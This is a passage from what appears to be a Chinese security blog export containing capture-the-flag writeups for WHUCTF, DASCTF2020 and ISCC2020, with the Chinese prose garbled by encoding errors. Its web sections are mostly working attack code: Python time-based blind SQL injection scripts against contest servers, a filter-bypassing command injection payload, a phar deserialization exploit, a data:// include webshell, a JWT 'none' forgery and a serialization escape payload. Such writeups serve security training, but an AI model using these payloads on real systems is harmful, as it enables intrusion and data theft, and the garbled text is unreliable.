æ±‰å­—çš„ç§˜å¯†å½“é“ºå¯†ç  åŸæ–‡ï¼š 12ç‹å£® å¤«å·¥ ç‹ä¸­ ç‹å¤« ç”±ç”±äº• äº•äºº å¤«ä¸­ å¤«å¤« äº•ç‹ åœŸåœŸ å¤«ç”±åœŸå¤« äº•ä¸­ å£«å¤« ç‹å·¥ ç‹äºº åœŸç”± ç”±å£å¤« æ›¿æ¢å: 1269 74 62 67 118 83 72 77 86 55 7157 82 57 64 63 51 107 æ¥ç€è½¬asciiå¾—åˆ° 12EJ&gt;CvSHMV7G9R9@?3k åº”è¯¥æƒ³åˆ°çš„,tclï¼ŒEå’ŒFå·®1ï¼ŒJå’ŒLå·®2 12345678s=&#x27;EJ&gt;CvSHMV7G9R9@?3k&#x27;j=1flag=&#x27;&#x27;for i in s: flag=flag+chr(ord(i)+j) j=j+1print(flag)# flag&#123;you_are_good&#125; miscPokeÌmonçœŸå°±ç©æ¸¸æˆå°±ç»™flagï¼Œç”¨VisualBoyAdvanceæ‰“å¼€ç©å°±å®Œäº‹äº† flag: 1flag&#123;PokEmon_14_CutE&#125; Harley Quinnå‹ç¼©åŒ…æè¿°é‡Œæœ‰æç¤º,æœäº†ä¸‹ï¼Œå‘ç°æ˜¯ FreeFileCamouflageä¸€ç§éšå†™æ–¹å¼ï¼Œå¯å°†æ–‡ä»¶éšå†™åœ¨JPGå›¾ç‰‡ä¸­ è§£å‹åœ¨Heathens.wavå±æ€§é‡Œçœ‹åˆ°hint æœ€åä¸€æ®µæ˜¯æ‹¨å·éŸ³ï¼Œå¯¹ç…§é¢‘è°± DTMFå¯¹ç…§è¡¨ ä½é¢‘ \\ é«˜é¢‘(Hz) 1209 1336 1477 1633 697 1 2 3 A 770 4 5 6 B 852 7 8 9 C 941 * 0 # D æˆ–è€…ç›´æ¥ä½¿ç”¨dtmf2num.exe å¾—å‡ºæ‹¨å·éŸ³ï¼š 1#222833344477773338866# ä¸‰ä¸ª2ä»£è¡¨2çš„ç¬¬ä¸‰ä¸ªå­—æ¯å³cï¼Œä»¥æ­¤ç±»æ¨å¾—åˆ° 1ctfisfun ç„¶åè§£å¯†å°±è¡Œ ä¼šå¾—åˆ°flag.txt 1flag&#123;Pudd1n!!_y0u_F1nd_m3!&#125;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"}]},{"title":"WHUCTF web wp","slug":"WHUCTF-web-wp","date":"2020-05-23T09:02:22.000Z","updated":"2020-06-02T08:18:18.450Z","comments":true,"path":"2020/05/23/WHUCTF-web-wp/","link":"","permalink":"http://www.m00nback.xyz/2020/05/23/WHUCTF-web-wp/","excerpt":"æ­¦æ±‰å¤§å­¦èŒæ–°èµ›çš„é¢˜ç›®ï¼Œåšåšå§ï¼","text":"æ­¦æ±‰å¤§å­¦èŒæ–°èµ›çš„é¢˜ç›®ï¼Œåšåšå§ï¼ Easy_sqliæœ‰sqlè¯­å¥å›æ˜¾ï¼Œå¾ˆå‹å¥½äº†ï¼Œexp: 123456789101112131415161718192021222324252627282930313233343536373839import requestsurl=&quot;http://218.197.154.9:10011/login.php&quot;flag=&#x27;&#x27;proxies=&#123; &#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125;# easy_sql1for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 print(mid) data=&#123; &#x27;user&#x27;:&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;.format(str(i),str(mid)), &#x27;pass&#x27;:&#x27;admin&#x27; &#125; data1=&#123; &#x27;user&#x27;:&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)#&quot;.format(str(i),str(mid)), &#x27;pass&#x27;:&#x27;admin&#x27; &#125; try: r1=requests.post(url,data=data1,timeout=3,proxies=proxies) except requests.exceptions.ReadTimeout as e: flag=flag+chr(mid) print(chr(mid)) break else: try: r=requests.post(url,data=data,timeout=3,proxies=proxies) except requests.exceptions.ReadTimeout as e: low=mid+1 else: top=mid-1 if flag==f1: breakprint(flag) çˆ†æ•°æ®åº“ï¼š 12345data=&#123; &#x27;user&#x27;:&quot;admin&#x27; and if(ascii(substring((database()),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)#&quot;.format(str(i),str(mid)), &#x27;pass&#x27;:&#x27;admin&#x27; &#125;# easy_sql1 çˆ†è¡¨ï¼š 12345data=&#123; &#x27;user&#x27;:&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;.format(str(i),str(mid)), &#x27;pass&#x27;:&#x27;admin&#x27; &#125;# f1ag_y0u_wi1l_n3ver_kn0w,users çˆ†å­—æ®µï¼š 12345data=&#123; &#x27;user&#x27;:&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_schema=database() and table_name=&#x27;f1ag_y0u_wi1l_n3ver_kn0w&#x27; ),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;.format(str(i),str(mid)), &#x27;pass&#x27;:&#x27;admin&#x27; &#125;# f111114g çˆ†å†…å®¹ï¼š 12345data=&#123; &#x27;user&#x27;:&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(f111114g) frfromom easy_sql1.f1ag_y0u_wi1l_n3ver_kn0w),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;.format(str(i),str(mid)), &#x27;pass&#x27;:&#x27;admin&#x27; &#125;# WHUCTF&#123;r3lly_re11y_n0t_d1ffIcult_yet??~&#125; ezphpæºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phperror_reporting(0);highlight_file(__file__);$string_1 = $_GET[&#x27;str1&#x27;];$string_2 = $_GET[&#x27;str2&#x27;];//1stif($_GET[&#x27;num&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;num&#x27;]))&#123; echo &#x27;1st ok&#x27;.&quot;&lt;br&gt;&quot;;&#125;else&#123; die(&#x27;ä¼šä»£ç å®¡è®¡å˜›23333&#x27;);&#125;//2ndif(is_numeric($string_1))&#123; $md5_1 = md5($string_1); $md5_2 = md5($string_2); if($md5_1 != $md5_2)&#123; $a = strtr($md5_1, &#x27;pggnb&#x27;, &#x27;12345&#x27;); $b = strtr($md5_2, &#x27;pggnb&#x27;, &#x27;12345&#x27;); if($a == $b)&#123; echo &#x27;2nd ok&#x27;.&quot;&lt;br&gt;&quot;; &#125; else&#123; die(&quot;can u give me the right str???&quot;); &#125; &#125; else&#123; die(&quot;no!!!!!!!!&quot;); &#125;&#125;else&#123; die(&#x27;is str1 numeric??????&#x27;);&#125;//3ndfunction filter($string)&#123; return preg_replace(&#x27;/x/&#x27;, &#x27;yy&#x27;, $string);&#125;$username = $_POST[&#x27;username&#x27;];$password = &quot;aaaaa&quot;;$user = array($username, $password);$r = filter(serialize($user));if(unserialize($r)[1] == &quot;123456&quot;)&#123; echo file_get_contents(&#x27;flag.php&#x27;);&#125; ç¬¬ä¸€å±‚å¾ˆå¥½ç»•ï¼Œç›´æ¥%0aå°±è¡Œ ç¬¬äºŒå±‚è¦æ±‚ä¸¤ä¸ªæ•°md5ä¸ç›¸ç­‰ï¼Œç»è¿‡strtrå‡½æ•°æ›¿æ¢ï¼Œè¯¥å‡½æ•°ç›¸å½“äºç”Ÿæˆä¸€ä¸ªæ›¿æ¢å­—å…¸ï¼ŒæŒ‰ç…§å­—å…¸é”®å€¼æ›¿æ¢ 123strtr($md5_1, &#x27;pggnb&#x27;, &#x27;12345&#x27;)// ç›¸å½“äº// p-&gt;1 g-&gt;3 n-&gt;4 b-&gt;5 è¿™æ ·å°±å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬(ä¸æ˜¯æˆ‘å†™çš„) 123456789101112131415&lt;?php$count = 0;for ($i = 1; $i &lt;= 100000000; $i++) &#123; $md5 = strtr(md5($i), &#x27;pggnb&#x27;, &#x27;12345&#x27;); if (preg_match(&#x27;/^0e\\d+$/&#x27;, $md5)) &#123; echo $i . &quot; &quot; . md5($i) . &quot;\\n&quot;; $count++; &#125; if ($count == 2) &#123; break; &#125;&#125;// 11230178 0e732639146814822596b49bb6939b97// 20493141 0e343359461627b56649445b748588b8// æ›¿æ¢å0eåé¢å‡ä¸ºçº¯æ•°å­— æœ€åä¸€ç‚¹ç›¸ç­‰åˆ©ç”¨phpè®¤ä¸º0eå¼€å¤´ä¸”åé¢æ˜¯çº¯æ•°å­—çš„éƒ½ç›¸ç­‰çš„ç‰¹æ€§ æœ€åä¸€å…³æ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œæ­£å¸¸åºåˆ—åŒ–çš„ç»“æœï¼š 1a:2:&#123;i:0;s:4:&quot;test&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125; ç¡®å®šè¦æ·»åŠ çš„å†…å®¹,é•¿åº¦ä¸º20 1&quot;;i:1;s:6:&quot;123456&quot;;&#125; åˆ—æ–¹ç¨‹ï¼Œnä¸ºxå­—ç¬¦æ•°é‡ï¼Œyä¸ºå…¶ä»–å­—ç¬¦ 1n+y+20=2n+y è§£å¾—n=20ï¼Œæ•…æ„é€  1username=xxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125; æŸ¥çœ‹æºç å¾—åˆ°flag ezcmdæºç ï¼š 123456789101112131415161718192021222324252627282930313233&lt;?phpif(isset($_GET[&#x27;ip&#x27;]))&#123; $ip = $_GET[&#x27;ip&#x27;]; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;no space!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;no flag&quot;); &#125; else if(preg_match(&quot;/tac|rm|echo|cat|nl|less|more|tail|head/&quot;, $ip))&#123; die(&quot;cat&#x27;t read flag&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&lt;pre&gt;&quot;; print_r($a);&#125;highlight_file(__FILE__);?&gt; ä¸çŸ¥é“ä¸ºå•¥curlï¼Œechoéƒ½ç”¨ä¸äº†ï¼Œpayload: 1?ip=||a=ca;b=t;$a$b$IFS`ls` ezincludeè„‘æ´é¢˜ï¼Œæ‰«ç›®å½•æœ‰ï¼šinfo.php,phpinfo å¼€äº†ä¸€å¤§å †æ‰©å±•ï¼Œç«‹é©¬æƒ³åˆ°äº†phpinfoåŒ…å«ä¸´æ—¶æ–‡ä»¶getshell æ‰¾äº†åŠå¤©æ²¡æ²¡æ‰¾åˆ°åŒ…å«ç‚¹ï¼Œæœ€åå‘ç° å°±å¾ˆå¥‡æ€ªï¼Œç›´æ¥php://filterå°±èƒ½è¯»flagï¼Œå¥‡æ€ª Easy_unserializeæˆ‘å¤ªèœäº†ï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ° htmlæ˜¯è¿™æ ·å†™çš„ï¼š 1&lt;input type=&quot;submit&quot; name=&quot;acti0n&quot; placeholder=&quot;ä¸Šä¼ å›¾ç‰‡&quot; value=&quot;upload&quot; class=&#x27;btn&#x27; id=&#x27;b1&#x27;&gt; è‡ªåŠ¨è¿›è¡Œ302è·³è½¬ è¿™é‡Œå­˜åœ¨æ–‡ä»¶åŒ…å«çš„,æ„é€ ï¼š 12?acti0n=php://filter/convert.bAse64-encode/resource=upload.php?acti0n=php://filter/string.rot13/resource=upload.php è¯»åˆ°æºç upload.phpï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php error_reporting(0);$dir = &#x27;upload/&#x27;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]).&#x27;/&#x27;;if(!is_dir($dir)) &#123; if(!mkdir($dir, 0777, true)) &#123; echo error_get_last()[&#x27;message&#x27;]; die(&#x27;Failed to make the directory&#x27;); &#125;&#125;chdir($dir);if(isset($_POST[&#x27;submit&#x27;])) &#123; $name = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; $tmp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]; $ans = exif_imagetype($tmp_name); if($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt;= 204800) &#123; die(&#x27;filesize too big.&#x27;); &#125; if(!$name) &#123; die(&#x27;filename can not be empty!&#x27;); &#125; if(preg_match(&#x27;/(htaccess)|(user)|(\\.\\.)|(%)|(#)/i&#x27;, $name) !== 0) &#123; die(&#x27;Hacker!&#x27;); &#125; if(($ans != IMAGETYPE_GIF) &amp;&amp; ($ans != IMAGETYPE_JPEG) &amp;&amp; ($ans != IMAGETYPE_PNG)) &#123; $type = $_FILES[&#x27;file&#x27;][&#x27;type&#x27;]; if($type == &#x27;image/gif&#x27; or $type == &#x27;image/jpg&#x27; or $type == &#x27;image/png&#x27; or $type == &#x27;image/jpeg&#x27;) &#123; echo &quot;&lt;p align=\\&quot;center\\&quot;&gt;Don&#x27;t cheat me with Content-Type!&lt;/p&gt;&quot;; &#125; echo(&quot;&lt;p align=\\&quot;center\\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;); exit; &#125; $content = file_get_contents($tmp_name); if(preg_match(&#x27;/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i&#x27;, $content) !== 0) &#123; echo(&#x27;&lt;script&gt;alert(&quot;You could not upload this image because of some dangerous code in your file!&quot;)&lt;/script&gt;&#x27;); exit; &#125; $extension = substr($name, strrpos($name, &quot;.&quot;) + 1); if(preg_match(&#x27;/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i&#x27;, $extension) === 0) &#123; die(&quot;&lt;p align=\\&quot;center\\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;); &#125; $upload_file = $name; move_uploaded_file($tmp_name, $upload_file); if(file_exists($name)) &#123; echo &quot;&lt;p align=\\&quot;center\\&quot;&gt;Your file $name has been uploaded.&lt;br&gt;&lt;/p&gt;&quot;; &#125; else &#123; echo &#x27;&lt;script&gt;alert(&quot;ä¸Šä¼ å¤±è´¥&quot;)&lt;/script&gt;&#x27;; &#125; echo &quot;&lt;p align=\\&quot;center\\&quot;&gt;&lt;a href=\\&quot;view.php\\&quot; &gt;ç‚¹æˆ‘å»çœ‹ä¸Šä¼ çš„æ–‡ä»¶&lt;/a&gt;&lt;/p&gt;&quot;; #header(&quot;refresh:3;url=index.php&quot;);&#125; ?&gt; view.php: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php#include_once &quot;flag.php&quot;; error_reporting(0);class View&#123; public $dir; private $cmd; function __construct() &#123; $this-&gt;dir = &#x27;upload/&#x27;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]).&#x27;/&#x27;; $this-&gt;cmd = &#x27;echo &quot;&lt;div style=\\&quot;text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\\&quot;&gt;Powered by: xxx&lt;/div&gt;&quot;;&#x27;; if(!is_dir($this-&gt;dir)) &#123; mkdir($this-&gt;dir, 0777, true); &#125; &#125; function get_file_list() &#123; $file = scandir(&#x27;.&#x27;); return $file; &#125; function show_file_list() &#123; $file = $this-&gt;get_file_list(); for ($i = 2; $i &lt; sizeof($file); $i++) &#123; echo &quot;&lt;p align=\\&quot;center\\&quot; style=\\&quot;font-weight: bold;\\&quot;&gt;[&quot;.strval($i - 1).&quot;] $file[$i] &lt;/p&gt;&quot;; &#125; &#125; function show_img($file_name) &#123; $name = $file_name; $width = getimagesize($name)[0]; $height = getimagesize($name)[1]; $times = $width / 200; $width /= $times; $height /= $times; $template = &quot;&lt;img style=\\&quot;clear: both;display: block;margin: auto;\\&quot; src=\\&quot;$this-&gt;dir$name\\&quot; alt=\\&quot;$file_name\\&quot; width = \\&quot;$width\\&quot; height = \\&quot;$height\\&quot;&gt;&quot;; echo $template; &#125; function delete_img($file_name) &#123; $name = $file_name; if (file_exists($name)) &#123; @unlink($name); if(!file_exists($name)) &#123; echo &quot;&lt;p align=\\&quot;center\\&quot; style=\\&quot;font-weight: bold;\\&quot;&gt;æˆåŠŸåˆ é™¤! 3såè·³è½¬&lt;/p&gt;&quot;; header(&quot;refresh:3;url=view.php&quot;); &#125; else &#123; echo &quot;Can not delete!&quot;; exit; &#125; &#125; else &#123; echo &quot;&lt;p align=\\&quot;center\\&quot; style=\\&quot;font-weight: bold;\\&quot;&gt;æ‰¾ä¸åˆ°è¿™ä¸ªæ–‡ä»¶! &lt;/p&gt;&quot;; &#125; &#125; function __destruct() &#123; eval($this-&gt;cmd); &#125;&#125;$ins = new View();chdir($ins-&gt;dir);echo &quot;&lt;h3&gt;å½“å‰ç›®å½•ä¸º &quot; . $ins-&gt;dir . &quot;&lt;/h3&gt;&quot;;$ins-&gt;show_file_list();if (isset($_POST[&#x27;show&#x27;])) &#123; $file_name = $_POST[&#x27;show&#x27;]; $ins-&gt;show_img($file_name);&#125;if (isset($_POST[&#x27;delete&#x27;])) &#123; $file_name = $_POST[&#x27;delete&#x27;]; $ins-&gt;delete_img($file_name);&#125;unset($ins);?&gt; ä¸ç”¨pharååºåˆ—åŒ–ä¹Ÿèƒ½getflagï¼Œæ²¡è¿‡æ»¤assertç›´æ¥ä¼ ä¸ªé©¬åŒ…å« å†çœ‹çœ‹pharååºåˆ—åŒ–æ€æœ«æå¾—å§ï¼Œpharååºåˆ—åŒ–å½±å“çš„å‡½æ•°ï¼š åœ¨delete_imgå‡½æ•°é‡Œæˆ‘ä»¬çœ‹åˆ°äº†file_existså‡½æ•°ï¼Œç”±æ­¤ï¼Œæ€è·¯å¾ˆæ˜ç¡®ï¼Œä¸Šä¼ pharæ–‡ä»¶ï¼Œç„¶ååˆ é™¤æ–‡ä»¶å°±èƒ½è§¦å‘ååºåˆ—åŒ–äº†ï¼Œæ„é€ exp: 123456789101112131415&lt;?phpclass View&#123; public $dir; private $cmd=&quot;echo &#x27;ok&#x27;;readfile(&#x27;/var/www/html/flag.php&#x27;);&quot;;&#125;$object = new View;$phar = new Phar(&quot;s.phar&quot;); //åç¼€åå¿…é¡»ä¸º phar$phar-&gt;startBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$phar-&gt;setMetadata($object); //å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest$phar-&gt;addFromString(&quot;a.txt&quot;, &quot;a&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt; ç„¶åä¸Šä¼ pharæ–‡ä»¶ï¼Œæ”¹ä¸‹åç¼€ä¸ºgif,éœ€è¦ç”¨ç»å¯¹è·¯å¾„ï¼ŒæŸ¥çœ‹æºç å¾—åˆ°flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"}]},{"title":"DASCTF2020 wp","slug":"DASCTF2020-wp","date":"2020-05-22T00:16:07.000Z","updated":"2020-06-02T08:17:54.823Z","comments":true,"path":"2020/05/22/DASCTF2020-wp/","link":"","permalink":"http://www.m00nback.xyz/2020/05/22/DASCTF2020-wp/","excerpt":"BJDCTFç¬¬ä¸‰å±Šå’ŒDASCTFè”åˆä¸¾åŠçš„æ¯”èµ›ï¼","text":"BJDCTFç¬¬ä¸‰å±Šå’ŒDASCTFè”åˆä¸¾åŠçš„æ¯”èµ›ï¼ webå¸®å¸®å°çº¢èŠ±è¿™é¢˜åˆšå¼€å§‹æœ‰éé¢„æœŸï¼Œç›´æ¥å†™æ–‡ä»¶å°±è¡Œ æ”¹è¿‡ä¹‹åå¯ä»¥æ—¶é—´ç›²æ³¨çˆ†flagï¼Œexp: 12345678910111213141516171819202122import requestsimport stringimport urllib.parseurl=&quot;http://183.129.189.60:10069/?imagin=&quot;payload1=&quot;sleep $(cat /flag|cut -c &#123;&#125;|tr &#123;&#125; 3)&quot;payload2=&quot;if test $(cat /flag|cut -c &#123;&#125;) = &#123;&#125;;then sleep 3;fi&quot;s=string.ascii_letters+string.digits+&#x27;&#123;@~^*_+&#125;&#x27;flag=&#x27;&#x27;for i in range(1,50): f=flag for j in s: try: u=url+urllib.parse.quote(payload1.format(str(i),j)) r=requests.get(u,timeout=3) except requests.exceptions.ReadTimeout as e: flag=flag+j print(j) break if f==flag: breakprint(flag) gobå…ˆæµ‹ä¸‹åŠŸèƒ½ï¼Œå‘ç°æœ‰ç™»é™†ï¼Œä½†æ˜¯ç”¨ä»€ä¹ˆè´¦å·å¯†ç éƒ½èƒ½ç™»é™†ï¼Œåº”è¯¥ä¸æ˜¯sqlæ³¨å…¥ï¼Œ ç„¶åæœ‰ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹ï¼Œä¸Šä¼ ä»€ä¹ˆéƒ½ä¸ä¼šè§£æ è¿˜æœ‰ä¸ªå±•ç¤ºå¤´åƒçš„åœ°æ–¹ï¼Œæˆ‘ä»¬æ³¨æ„åˆ° ä¸Šä¼ æ–‡ä»¶æ—¶æˆ‘ä»¬å¯ä»¥ç›®å½•ç©¿è¶Šï¼Œå¯ä»¥ä¸Šä¼ åˆ°ä¸Šçº§ç›®å½•ï¼Œä½†æ˜¯è¿˜ä¸ä¼šè§£æï¼Œæ—¢ç„¶ä¸Šä¼ çš„å†…å®¹å¯ä»¥æ˜¾ç¤ºå‡ºæ¥ï¼Œæˆ‘ä»¬ç›´æ¥æ„é€ åˆ°flagé‚£è®©å®ƒè¯»flagä¸å°±è¡Œäº† è™½ç„¶ä¼šæç¤ºæ–‡ä»¶å­˜åœ¨ï¼Œä½†ä¸å½±å“æ–‡ä»¶è¯»å–ï¼Œç›´æ¥è§£ç base64åŠ å¯†çš„ç»“æœå¾—åˆ°flag è€å¼€å‘fuzzä¸€ä¸‹ï¼Œå‘ç°ä¸‹é¢å¯ä»¥æ³¨å…¥ 1username=admin&#x27; and 2=&#x27;2&amp;password=admin çŒœæµ‹åå°sqlè¯­å¥ 1select * from users where username=&#x27;$username&#x27; and password=&#x27;$password&#x27; æ­¤æ—¶æ³¨å…¥çš„å°±æ˜¯ 1select * from users where username=&#x27;admin&#x27; and 2=&#x27;2&#x27; and password=&#x27;admin&#x27;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"}]},{"title":"ISCC2020 writeup","slug":"ISCC2020-writeup","date":"2020-05-06T13:48:02.000Z","updated":"2020-06-02T08:14:56.981Z","comments":true,"path":"2020/05/06/ISCC2020-writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/05/06/ISCC2020-writeup/","excerpt":"è®°ä¸€ä¸‹éƒ¨åˆ†é¢˜ç›®çš„writeupå§ï¼","text":"è®°ä¸€ä¸‹éƒ¨åˆ†é¢˜ç›®çš„writeupå§ï¼ ç»ƒæ­¦é¢˜webé˜¿æ£®çš„çˆ±æƒ…-1æŠ“åŒ…å‘ç°Set-Cookieå­—æ®µï¼šæ·»åŠ å¹¶æ”¹æˆlogin=1 ç„¶åå‘ç° è§£ä¸‹MD5å‘ç°æ˜¯573495ï¼Œåæ¥å¬è¯´flagåœ¨readme.txtï¼Œä¸è¿‡è¢«åˆ äº† Php is the best languageä¸‹è½½æ–‡ä»¶ç»™å‡ºæºç ï¼š 1234567891011121314151617181920212223242526272829303132333435&lt;?php @error_reporting(1);include &#x27;flag.php&#x27;;class baby &#123; public $file; function __toString() &#123; if(isset($this-&gt;file)) &#123; $filename = &quot;./&#123;$this-&gt;file&#125;&quot;; if (base64_encode(file_get_contents($filename))) &#123; return base64_encode(file_get_contents($filename)); &#125; &#125; &#125;&#125;if (isset($_GET[&#x27;data&#x27;]))&#123; $data = $_GET[&#x27;data&#x27;]; $good = unserialize($data); echo $good;&#125;else &#123; $url=&#x27;./index.php&#x27;;&#125;$html=&#x27;&#x27;;if(isset($_POST[&#x27;test&#x27;]))&#123; $s = $_POST[&#x27;test&#x27;]; $html.=&quot;&lt;p&gt;Ã¨Â°Â¢Ã¨Â°Â¢Ã¥Ââ€šÃ¤Â¸Å½!&lt;/p&gt;&quot;;&#125;?&gt; æ‰«ç›®å½•å‘ç°flag.php,å¾ˆç®€å•çš„ä¸€é“ååºåˆ—åŒ–ï¼Œexp: 1234567&lt;?phpclass baby &#123; public $file=&#x27;flag.php&#x27;;&#125;$a=new baby;echo serialize($a); payload: 1http://101.201.126.95:7003/?data=O:4:%22baby%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125; base64è§£ç å³å¯ What can images doæ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œå‘ç°å›¾ç‰‡ç¤ºä¾‹é‚£é‡Œå¯ä»¥åŒ…å«ï¼Œç›´æ¥å›¾ç‰‡é©¬ ä¸Šä¼ å›¾ç‰‡é©¬ åŒ…å«å›¾ç‰‡é©¬ èšå‰‘è¿ï¼Œåœ¨flag.phpçœ‹åˆ°flag æœªçŸ¥çš„é£é™©-1jwté¢˜ç›®ï¼Œæç¤ºå¯†ç æ˜¯flag{*}å½¢å¼ï¼Œä½†æ˜¯è¿™é¢˜ä¸ç”¨ç ´è§£ï¼Œç›´æ¥æŠŠåŠ å¯†ç®—æ³•ä¿®æ”¹æˆnoneå°±è¡Œï¼Œexp: 12import jwt print(jwt.encode(&#123;&quot;id&quot;:&quot;user&quot;,&quot;iat&quot;:1588775401,&quot;jti&quot;:&quot;b0b6f6e4fb94a81390aa7cca9ed7f773&quot;&#125;,algorithm=&quot;none&quot;,key=&quot;&quot;).decode(encoding=&#x27;utf-8&#x27;)) æˆåŠŸæ›¿æ¢å‘ç°æ˜¯xxeï¼Œç›´æ¥è¯»flag.php Where is file?æºç ï¼š 123456789&lt;?phpshow_source(__FILE__);echo $_GET[&#x27;hello&#x27;];$file=$_GET[&#x27;file&#x27;];while (strstr($file, &quot;file://&quot;)) &#123; $file=str_replace(&quot;file://&quot;, &quot;&quot;, $file);&#125;include($file);?&gt; ç›´æ¥åŒ…å«data://åè®®getshell 1?file=data://text/plain,&lt;?php eval($_POST[1]);?&gt; flagåœ¨flag.phpé‡Œ 1flag&#123;web_include_file&#125; é˜¿æ£®çš„çˆ±æƒ…-2sqlæ³¨å…¥ï¼Œfuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤çš„å¹¶ä¸å¤šï¼Œä½†æŠŠç»å¸¸ç”¨çš„()è¿‡æ»¤äº†ï¼Œå¹¶ä¸”è¿‡æ»¤äº†passwordï¼Œorder byåˆ¤æ–­æœ‰ä¸‰åˆ—ï¼Œä¸”ç¬¬äºŒä½ä¸ºå›æ˜¾ä½ ä¹‹å‰æ²¡åšè¿‡è¿‡æ»¤æ‹¬å·çš„é¢˜ï¼Œæœäº†æœï¼Œå‘ç°å¯ä»¥ç”¨order byæ¯”è¾ƒæ³¨å…¥ å…ˆè¯´ä¸€ä¸‹order byï¼Œæˆ‘ä»¬éƒ½çŸ¥é“order by å¯ä»¥åˆ¤æ–­æŸ¥è¯¢çš„åˆ—æ•°ï¼Œä¸ºå•¥å‘¢ï¼Ÿ æˆ‘ä»¬åœ¨æŸ¥è¯¢çš„æ—¶å€™ï¼Œorder by çš„ä½œç”¨æ˜¯å¯¹æŸåˆ—è¿›è¡Œæ’åºï¼Œå¹¶ä¸”æ˜¯ä»¥ASCIIç çš„é¡ºåºæ¥çš„ å¦‚æœåˆ—æ•°è¶…è¿‡æŸ¥è¯¢çš„åˆ—æ•°è‡ªç„¶ä¼šæŠ¥é”™ é‚£ä¹ˆå¦‚ä½•è¿›è¡Œorder byæ¯”è¾ƒæ³¨å…¥å‘¢ï¼Ÿ å°±è¿™é“é¢˜è€Œè¨€ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œpasswordåœ¨ç¬¬ä¸‰åˆ—ï¼Œå¹¶ä¸”åªæœ‰ä¸€æ¡æ•°æ®ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥æŒ‰ç…§ è¿›è¡Œæ¯”è¾ƒæ³¨å…¥ï¼Œexp: 12345678910111213141516171819202122import requestsimport strings=string.digits+string.ascii_lowercaseurl=&#x27;http://101.201.126.95:7006/&#x27;flag=&#x27;&#x27;for j in range(50): f=flag for i in s: data=&#123; &quot;username&quot;:&quot;admin&#x27; union select 1,1433223,&#x27;&#123;&#125;&#x27; order by 3#&quot;.format(flag+i), &quot;password&quot;:&quot;aaa&quot; &#125; r=requests.post(url,data=data) 